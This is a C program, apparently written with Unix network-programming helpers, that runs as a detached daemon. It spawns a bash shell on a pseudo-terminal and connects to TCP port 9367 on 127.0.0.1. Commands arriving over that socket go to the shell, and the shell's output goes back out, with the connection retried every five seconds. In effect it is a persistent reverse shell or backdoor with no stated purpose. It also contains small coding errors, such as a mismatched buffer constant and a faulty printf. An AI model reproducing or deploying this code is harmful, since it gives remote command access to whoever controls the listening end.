#include "unp.h"
#include <sys/select.h>
#include <sys/types.h>
#include <signal.h>
#include <termios.h>
#include <errno.h>
#define	BUF_SIZE	16384		/* max #bytes to request from server */

void sig_child(int signo);
void server(char *host, char *port);

int setnonblocking(int fd)
{
    int old_option = fcntl( fd, F_GETFL );
    int new_option = old_option | O_NONBLOCK;
    Fcntl( fd, F_SETFL, new_option );
    return old_option;
}

static void set_noecho(int fd)		/* turn off echo (for slave pty) */
{
	struct termios	stermios;

	if (tcgetattr(fd, &stermios) < 0)
		printf("tcgetattr error");

	stermios.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL);
	stermios.c_oflag &= ~(ONLCR);
			/* also turn off NL to CR/NL mapping on output */

	if (tcsetattr(fd, TCSANOW, &stermios) < 0)
		printf("tcsetattr error");
}


int main(int argc, char **argv)
{
	int	sockfd, fdm;
	int	nbytes;
	int	logined;
	char 	slave_name[20];
	pid_t	pid = 0;
	fd_set	rset;

	char	request[BUF_SIZE];
	char	reply[BUF_SIZE];

	/* daemon_init */ 
	if((pid = Fork())!= 0)
		exit(0);
	setsid();
	signal(SIGCHLD, sig_child);
	signal(SIGINT, SIG_IGN);

	/*
	if(Fork() != 0)
		exit(0);
	*/

	chdir("/");
	umask(0);
	close(0);
	close(1);
	close(2);

	/* end daemon_init */

start:
	pid = pty_fork(&fdm, slave_name, 20, NULL, NULL);
	if (pid < 0)
		printf("fork error");

	else if (pid == 0) {		/* child with pty slave! */
		set_noecho(STDIN_FILENO);
		if( execl("/usr/bin/bash", NULL)  == -1)
			printf("%s execve error!", strerror(errno));
	}
	int cflags = fcntl(fdm,F_GETFL,0);
	fcntl(fdm,F_SETFL, cflags|O_NONBLOCK);

	sockfd = Tcp_connect("127.0.0.1", "9367");
	setnonblocking(sockfd);

	FD_ZERO(&rset);
	/*  parent process  */
	while(1){
		FD_SET(sockfd, &rset);
		FD_SET(fdm, &rset);
		select (sockfd + 1, &rset, NULL, NULL, NULL);
		if(FD_ISSET(sockfd, &rset)){
			memset(request, '\0', BUF_SIZE);
			nbytes = read(sockfd, request, BUF_SIZE);
			if ( nbytes < 0){
				/* error! */
				continue;
			}
			if ( nbytes == 0){
				printf("server closed sockfd %s", nbytes, strerror(errno));
				writen(fdm, "exit\n", 5);
				goto restart;
			}

			if (writen(fdm, request, nbytes) != nbytes)
				printf("writen error to master pty");
		}
		if(FD_ISSET(fdm, &rset)){
			memset(reply, '\0', BUF_SIZE);
			if ( (nbytes = read(fdm, reply, BUFFSIZE)) <= 0)
				goto restart;
			nbytes = write(sockfd, reply, nbytes);
			if( nbytes < 0 ){
				if (errno == EAGAIN)
					continue;
				else
					goto restart;
			}
		}
	}

restart:
	Close(sockfd);
	sleep(5);
	goto start;
}

void sig_child(int signo)
{
	pid_t pid;
	int stat;
	pid = wait(&stat);
}
